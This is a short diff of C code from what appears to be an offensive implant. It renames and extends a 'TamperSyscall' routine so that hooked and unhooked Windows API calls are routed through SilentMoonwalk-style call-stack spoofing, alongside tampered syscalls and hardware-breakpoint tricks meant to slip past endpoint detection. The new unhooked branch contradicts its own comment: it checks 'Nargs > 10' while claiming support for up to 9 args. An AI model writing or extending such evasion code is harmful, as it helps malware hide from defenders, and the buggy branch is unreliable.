@@ -34,7 +34,7 @@ PVOID SpoofStack(
     return SilentMoonwalkMain(pFunction, &args, agent->Walker->RetAddr);
 }
 
-NTSTATUS TamperSyscal(
+NTSTATUS TamperSyscall(
     ULONG_PTR uAddress,
     UINT Nargs,
     ULONG_PTR a,
@@ -74,7 +74,8 @@ NTSTATUS TamperSyscal(
         if(!InitializeTamperedSyscall(pDummyApi, g_SyscallList->Entries[SSN].dw64Hash, Nargs, a, b, c, d, e, f, g, h, i, j, k)) {
             return -1;
         }
-        if((NtStatus = pDummyApi(NULL, NULL, NULL, NULL, NULL, NULL ,NULL , NULL, NULL, NULL, NULL)) != 0x00) {
+
+        if((NtStatus = SpoofStack(pDummyApi, Nargs)) != 0x00) { // spoof the stack and call the api using NULL args, we've already setup the args in the tampered syscall.
             printf("[!] 0x%llx Failed With Error: 0x%llx \n", g_SyscallList->Entries[SSN].dw64Hash, NtStatus);
             return NtStatus;
         }
@@ -84,9 +85,14 @@ NTSTATUS TamperSyscal(
             return -1;
         }
     } else { // FUNCTION IS UNHOOKED WHY BOTHER SETING HARDWARE BP & SPOOFING ARGS AT ALL?
-       //implement indirect syscall calling here such as hell's hall.
+       // we should just spoof the stack and call the api. only supported for up to 9 args for now.
+        if(Nargs > 10) {
+            if ((NtStatus = SpoofStack(uAddress, Nargs, a, b, c, d, e, f, g, h, i)) != 0x00) {
+                printf("[error] 0x%llx attempting to spoof stack for syscall: 0x%llx\n", g_SyscallList->Entries[SSN].dw64Hash, NtStatus);
+                return NtStatus;
+            }
+        }
     }
-
 
     return NtStatus;
 }
